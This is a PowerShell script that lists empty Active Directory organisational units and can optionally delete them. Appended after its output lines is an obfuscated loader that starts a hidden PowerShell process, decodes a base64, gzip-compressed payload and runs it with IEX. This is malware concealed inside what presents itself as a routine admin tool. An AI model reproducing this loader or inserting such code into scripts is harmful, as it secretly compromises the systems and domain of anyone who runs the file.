﻿$remove_ous = $false

$ous_to_keep = @('UAP - PEAP TLS','UAP - PEAP TLS Only','Disabled Users');

$ad_objects = Get-ADObject -Filter "ObjectClass -eq 'user' -or ObjectClass -eq 'computer' -or ObjectClass -eq 'group' -or ObjectClass -eq 'organizationalUnit'";

$aOuDns = @();
foreach ($o in $ad_objects) {
	$sDn = $o.DistinguishedName;
	if ($sDn -like '*OU=*' -and $sDn -notlike '*LostAndFound*') {
		$sOuDn = $sDn.Substring($sDn.IndexOf('OU='));
		$aOuDns += $sOuDn;
	}
}

$a0CountOus = $aOuDns | Group-Object | Where-Object { $_.Count -eq 1 } | % { $_.Name };
$empty_ous = 0;
$ous_removed = 0;
foreach ($sOu in $a0CountOus) {
	if (!(Get-ADObject -Filter "ObjectClass -eq 'organizationalUnit'" | where { $_.DistinguishedName -like "*$sOu*" -and $_.DistinguishedName -ne $sOu })) {
		$ou = Get-AdObject -Filter { DistinguishedName -eq $sOu };
		if ($ous_to_keep -notcontains $ou.Name) {
			if ($remove_ous) {
				Set-ADOrganizationalUnit -Identity $ou.DistinguishedName -ProtectedFromAccidentalDeletion $false -confirm:$false;
				Remove-AdOrganizationalUnit -Identity $ou.DistinguishedName -confirm:$false
				$ous_removed++
			}
			$ou
			$empty_ous++;
		}
	}
}
echo '-------------------'
echo "Total Empty OUs Removed: $ous_removed"
echo "Total Empty OUs: $empty_ous"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADW27FcCA7VWbW/aSBD+nEr9D1aFZFslGAhtmkiVbo0hOAECcTBvRdXGXpuFtZfY6wTo9b/fGOyEXpsqV+kskPdlZvfZZ57ZsZeEjqA8lMTmg1nBgfTt7ZujHo6gpRSwbdpFqeB1ySZRj45gpkAiJEZ364d5rEufJWWKViuDB5iGs/PzehJFJBT7fumCCBTHJLhjlMSKKv0tDeckIsfXdwviCOmbVPhaumD8DrPMbFPHzpxIxyh007k2d3CKrGStGBWK/OWLrE6PK7NS4z7BLFZkaxMLEpRcxmRV+q6mG95uVkSRO9SJeMw9URrS8KRaGoQx9kgXVnsgHSLm3I1lFQ4Dv4iIJAqlw2Ol6+ytFBmavYg7yHUjEoNTyQwf+JIohTBhrCj9pUwzEDdJKGhAYF6QiK8sEj1Qh8SlFg5dRm6IN1O65DE/+2udlEMnsOqJSC1CXF5G2+Fuwsh+AVn9Ge8upCo8T2EFIr6/ffP2jZcLIbi5rNXNqocPpQCto+muTQCr0uMx3Rl/lspFqQPbYcGjDXQLt1FC1Jk0TUMxnc2kArurteeNaFF8eY1K7gDmvHpSO90uGzA8tTl1Z+CWBavA78fLdPxl0RnEoyExNiEOqJPrSvkV98RjZHfgUm7WBWCKnE0Q1yCM+FikNBal6c9ujYCKJ189ocyFsDgQvxhQQWjVH8HsI6PIZtghAXC178tpHEDNJLfOFLzJd0/7YCTXGY7jotRLIJ2comQRzIhblFAY02wKJYLvmvIz3E7CBHVwLPLlZmrOY7ZfnYexiBIHwgdnv7VWxKGYpVQUpRZ1ib6xqJ/vK/+SiDpmjIY+rPQAgYCRlABLpKKIAOKTANSSRYQZrBgJwG6X202GfcjkLBF2SsI+ceV/o8wVvpdzykdOxAFGCLLFuChKNo0EXBEpt7ma/hzGwSWxA1SPSBYWJU+dqb4RqdYL24nBjQDffW2lKs2Y2vESCeCkGfFAxzH5WLNEBIwp77RrWkfwjM2QdRx9SSvokVbMDvwH9MTkxql7dbloaZGxnnvIjM1Oq2f0W63aw6Vl14TVMMVVzxSdxmixsFDrZjAWExO1bml5Oa5tV5d0a7WRO15rH7f69rGsr7cL3/XGhuf5p551U/nQpO1hva+Xq7htNJL2UH/Uy7W4QR9bfTroLy+b4m5sMzzwNH9UOcN03Y4WdoV3tiZCF/MTZ3vp2RfzjrsZt7SzYW2JGgjVw4bd1PnVWI9QT7Oxb/O630B+4NeR3vQpmfQHTb3fb+pocLG4N840H3xHeK4P7SqdrEY3c+g3AcKVVq6ZLtnycR9IuuAI+zdg49erztwDG+M90t93eVzFS50jHWyak3vANV41ewzmbwdVjmzWHWHUnmyamlYZ92qoVabDCx+lS2Jf72MUPxhbQ6vYLneHH7pjT7NH7FQz6rcrx9M07bFlXDmTyvrT9emn9pDaAUcDTbPfpeoAeRS8kXV2GPCXrvUOjuI5ZiAEuKjzhGzyqJndvD1OUw9FyUvxkkQhYVDAoMTlokaMcSctAs/XNFShfW2YQXoOoHlS/WVLlZ4M1efSkA+dn08ALeTJs4hLbRL6Yl4sr0/KZbjny+taGQ79+nPW+WqjHCxYTKvFnq8fN2K7jdQ0mQrLUd/539nMsngOL/dVbD6P/Wb2VQyXixkDP43/OPCfmP4TDoaYCjC24CZiZF8df0NFpqGDb4o0UKANL3vSL7zrRBx34VPjH6NRtfdWCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

